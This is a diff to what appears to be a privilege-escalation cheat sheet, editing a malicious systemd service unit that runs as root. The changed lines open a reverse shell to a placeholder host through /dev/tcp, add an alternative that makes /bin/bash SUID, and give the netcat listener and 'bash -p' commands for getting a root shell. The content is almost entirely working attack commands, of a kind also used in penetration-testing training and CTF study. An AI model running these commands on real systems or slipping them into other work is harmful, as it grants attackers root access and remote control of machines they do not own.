@@ -12,7 +12,9 @@ Description=roooooooooot
 [Service]
 Type=simple
 User=root
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+ExecStart=/bin/sh -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+# Alternatively
+# ExecStart=/bin/sh -c 'chmod +s /bin/bash'
 
 [Install]
 WantedBy=multi-user.target
@@ -20,8 +22,11 @@ WantedBy=multi-user.target
 ```
 
 ```
-Listen on <port>
+# Listen on <port>
 $ nc -nlvp <port>
+
+# For set /bin/bash as suid binary approach, simply run:
+$ bash -p
 ```
 
 ```
